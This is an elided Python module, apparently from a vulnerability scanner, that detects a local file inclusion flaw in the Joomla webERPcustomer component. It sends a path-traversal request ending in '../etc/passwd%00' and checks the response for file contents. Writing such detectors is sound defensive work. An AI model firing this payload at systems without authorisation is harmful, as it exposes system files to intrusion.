#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A directory traversal vulnerability in weberpcustomer."""
...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Joomla! Component webERPcustomer - Local File Inclusion Detection',
        ...
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2010', 'joomla', 'lfi', 'edb', 'packetstorm', 'joomlamo', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/index.php?option=com_weberpcustomer&controller=../../../../../../../../../../etc/passwd%00', allow_redirects=False)
        ...
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="Joomla! Component webERPcustomer - Local File Inclusion detected",
                path='/index.php?option=com_weberpcustomer&controller=../../../../../../../../../../etc/passwd%00',
            )
            return True
        return False
